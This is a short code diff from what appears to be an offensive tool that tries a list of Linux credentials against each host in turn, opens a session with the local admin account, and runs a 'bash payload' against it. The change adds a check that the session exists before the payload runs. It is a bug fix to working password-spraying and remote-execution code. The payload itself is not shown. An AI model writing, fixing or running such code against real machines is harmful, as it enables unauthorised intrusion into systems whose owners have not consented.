@@ -120,8 +120,9 @@ def main():
             for password in linux_credentials:
                 try:
                     session = create_linux_session(host, local_admin, password)
-                    print(f"Executing bash payload against {host}")
-                    linux_execute(session)
+                    if session is not None:
+                        print(f"Executing bash payload against {host}")
+                        linux_execute(session)
                 except Exception:
                     continue
 
